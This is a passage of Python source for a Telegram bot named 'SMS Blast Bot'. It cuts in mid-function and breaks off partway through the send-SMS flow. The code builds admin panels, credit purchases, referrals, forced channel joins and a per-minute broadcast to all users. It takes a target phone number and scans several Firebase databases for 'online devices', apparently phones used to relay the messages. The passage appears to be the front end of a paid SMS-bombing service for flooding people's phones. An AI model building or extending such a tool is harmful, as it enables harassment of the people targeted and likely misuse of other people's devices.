        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔", style="primary")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="success")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    auto_loop = d.get("auto_loop", {})
    loop_status = f"{em(EMOJI_CHECK, '🟢')} 1ᴍ ᴀᴄᴛɪᴠᴇ" if auto_loop.get("enabled") and auto_loop.get("message") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 90 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_BELL, '🔔')} ᴀᴜᴛᴏ 1ᴍ ᴍsɢ  : {loop_status}\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 90 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = btn("ᴅɪsᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ", "owner:free:off", EMOJI_CROSS, "🔴", style="danger") if d.get("free_mode") else btn("ᴇɴᴀʙʟᴇ ғʀᴇᴇ ᴍᴏᴅᴇ", "owner:free:on", EMOJI_CHECK, "🟢", style="success")
    auto_loop = d.get("auto_loop", {})
    loop_btn = btn("ᴀᴜᴛᴏ 1ᴍ ᴍsɢ: ᴏɴ", "owner:autoloop:menu", EMOJI_BELL, "🟢", style="success") if auto_loop.get("enabled") else btn("ᴀᴜᴛᴏ 1ᴍ ᴍsɢ: ᴏғғ", "owner:autoloop:menu", EMOJI_BELL, "🔴", style="danger")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="primary")],
        [loop_btn, btn("ᴄʟᴇᴀɴ ʙᴀᴅ ғʙ", "owner:fb:cleanup", EMOJI_CROSS, "🧹", style="danger")],
        [btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"), btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="primary")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫", style="danger"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ᴀᴄᴛɪᴠɪᴛʏ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜", style="primary"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="primary"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰", style="danger"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰", style="danger"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒", style="primary")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊", style="primary")],
        [mode_btn],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary"), btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤", style="success")],
        [btn("📹 ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹", style="primary"), btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳", style="primary")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁", style="primary"), btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary")],
        [btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊", style="primary"), btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜", style="primary")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰", style="success")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸", style="primary")],
        [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️", style="primary")],
    ])

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    current_fbs = fbs[page * per_page:page * per_page + per_page]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="primary")
        ],
        [
            btn("🔄 sᴄᴀɴ ɴᴏᴡ", "owner:fb:scan_now", EMOJI_GEAR, "🔄", style="success"),
            btn("🧹 ᴄʟᴇᴀɴ ʙᴀᴅ", "owner:fb:cleanup", EMOJI_CROSS, "🧹", style="danger")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑", style="danger")
        ])

    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="danger")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def auto_loop_menu_kb(d: dict) -> InlineKeyboardMarkup:
    loop_cfg = d.get("auto_loop", {})
    is_on = bool(loop_cfg.get("enabled"))
    toggle_btn = btn("ᴛᴜʀɴ ᴏғғ ᴀᴜᴛᴏ 1ᴍ", "owner:autoloop:toggle", EMOJI_CROSS, "🔴", style="danger") if is_on else btn("ᴛᴜʀɴ ᴏɴ ᴀᴜᴛᴏ 1ᴍ", "owner:autoloop:toggle", EMOJI_CHECK, "🟢", style="success")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✏️ sᴇᴛ / ᴄʜᴀɴɢᴇ ᴍsɢ", "owner:autoloop:set", EMOJI_CHECK, "✏️", style="primary")],
        [toggle_btn],
        [btn("▶️ sᴇɴᴅ ɴᴏᴡ & ʀᴇғʀᴇsʜ", "owner:autoloop:tick_now", EMOJI_ROCKET, "▶️", style="success")],
        [btn("🗑 ᴄʟᴇᴀʀ ᴍsɢ & sᴛᴏᴘ", "owner:autoloop:clear", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    ])

R = Router()

@R.callback_query(F.data == "owner:fb:scan_now")
async def owner_fb_scan_now(cq: CallbackQuery, state: FSMContext):
    await cq.answer("🔄 Scanning Firebase APIs...")
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    global CACHED_DEVICES, LAST_SCAN_TIME, FB_DEVICE_COUNTS, SCAN_STATUS
    devices = await get_all_online_devices(d)
    CACHED_DEVICES = devices
    LAST_SCAN_TIME = time.time()
    for fb in d.get("firebases", []):
        FB_DEVICE_COUNTS[fb["id"]] = {
            "label": fb.get("label", fb["url"][:30]),
            "online": sum(1 for dv in devices if dv["fb_id"] == fb["id"]),
            "last_update": int(time.time())
        }
    SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴏɴʟɪɴᴇ | {fmt_time(int(time.time()))}"
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Scan Complete!</b>\n\n"
            f"Total Firebase DBs: <b>{len(d.get('firebases', []))}</b>\n"
            f"Online APIs/Devices: <b>{len(devices)}</b>",
            reply_markup=fb_menu_kb(d, 0),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:autoloop:menu")
async def owner_autoloop_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.clear()
    loop_cfg = d.get("auto_loop", {})
    status = f"{em(EMOJI_CHECK, '🟢')} <b>ACTIVE (Every 1 Min)</b>" if loop_cfg.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} <b>OFF</b>"
    msg_preview = loop_cfg.get("message") or "<i>Not Set</i>"
    tracked_users = len(loop_cfg.get("last_msg_ids", {}))

    try:
        await cq.message.edit_text(
            f"{em(EMOJI_BELL, '🔔')} <b>Auto 1-Minute User Message</b>\n\n"
            f"• Status: {status}\n"
            f"• Interval: <b>Every 60 Seconds (1 Min)</b>\n"
            f"• Auto-Delete Previous: <b>ENABLED</b>\n"
            f"• Tracked Chats: <b>{tracked_users}</b>\n\n"
            f"<b>Current Message:</b>\n<code>{msg_preview[:300]}</code>",
            reply_markup=auto_loop_menu_kb(d),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:autoloop:set")
async def owner_autoloop_set_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    if not is_owner(cq.from_user.id, load()):
        return
    await state.set_state(S.set_auto_loop_msg)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_BELL, '✏️')} <b>Set Auto 1-Minute Message</b>\n\n"
            f"Jo message har user ko <b>har 1 minute</b> mein automatic bhejna hai woh likhein:\n"
            f"<i>Har naye message ke saath purana message auto-delete ho jayega.</i>",
            reply_markup=kb([(f"{sc('cancel')}", "owner:autoloop:menu")]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.set_auto_loop_msg)
async def owner_autoloop_set_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    text = (msg.text or "").strip()
    if not text:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya valid text message bhejein.", parse_mode="HTML")
        return

    d.setdefault("auto_loop", {})
    d["auto_loop"]["message"] = text
    d["auto_loop"]["enabled"] = True
    log_activity(d, "auto_loop_set", uid, f"Enabled 1-min auto loop msg ({len(text)} chars)")
    save(d)
    await state.clear()

    asyncio.create_task(run_auto_loop_tick(msg.bot))
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Auto 1-Minute Message Activated!</b>\n\n"
        f"Har 1 minute mein sabhi users ko yeh message jayega aur pichhla message auto-delete hoga.",
        reply_markup=auto_loop_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:autoloop:toggle")
async def owner_autoloop_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    loop_cfg = d.setdefault("auto_loop", {})
    if not loop_cfg.get("enabled") and not (loop_cfg.get("message") or "").strip():
        await cq.answer("⚠️ Pehle message set karein!", show_alert=True)
        return
    loop_cfg["enabled"] = not bool(loop_cfg.get("enabled"))
    save(d)
    await cq.answer("🟢 Auto 1M ON!" if loop_cfg["enabled"] else "🔴 Auto 1M OFF!")
    await owner_autoloop_menu(cq, state)

@R.callback_query(F.data == "owner:autoloop:tick_now")
async def owner_autoloop_tick_now(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    if not (d.get("auto_loop", {}).get("message") or "").strip():
        await cq.answer("⚠️ Pehle message set karein!", show_alert=True)
        return
    d["auto_loop"]["enabled"] = True
    save(d)
    await cq.answer("🔄 Sending & refreshing...")
    asyncio.create_task(run_auto_loop_tick(cq.bot))
    await owner_autoloop_menu(cq, state)

@R.callback_query(F.data == "owner:autoloop:clear")
async def owner_autoloop_clear(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    d["auto_loop"] = {"enabled": False, "message": "", "last_msg_ids": {}}
    save(d)
    await cq.answer("🗑 Auto Loop cleared!")
    await owner_autoloop_menu(cq, state)

@R.callback_query(F.data == "owner:fb:cleanup")
async def owner_fb_cleanup(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    await cq.answer("🧹 Cleaning missing/expired Firebase...")
    summary = await cleanup_bad_firebases(d)
    fresh = load()
    log_activity(fresh, "fb_cleanup", cq.from_user.id, f"Removed {summary['removed']}/{summary['total']} bad/expired FBs")
    save(fresh)

    removed_lines = [
        f"• <code>{item['label']}</code> — <i>{item['reason']}</i>"
        for item in summary["removed_items"][:15]
    ]
    removed_block = "\n".join(removed_lines) if removed_lines else "<i>Koi missing/expired Firebase nahi mila.</i>"

    try:
        await cq.message.edit_text(
            f"{em(EMOJI_CHECK, '🧹')} <b>Firebase Cleanup Complete!</b>\n\n"
            f"• Total Checked : <b>{summary['total']}</b>\n"
            f"• Removed (Bad/Expired) : <b>{summary['removed']}</b>\n"
            f"• Active Kept : <b>{summary['kept']}</b>\n\n"
            f"<b>Removed Items:</b>\n{removed_block}",
            reply_markup=fb_menu_kb(fresh, 0),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass
# ========== START / FORCE JOIN / SMS BLAST ==========
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
        save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein: {SUPER_ADMIN_NAME}", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein: {SUPER_ADMIN_NAME}", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    await cq.answer("🔄 Checking...")
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass
        return

    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome! Verified Successfully.\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except Exception:
            pass
        return

    if not can_use(uid, d):
        await cq.message.answer("🚫 Access denied!")
        return
    await state.set_state(S.send_number)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
            f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
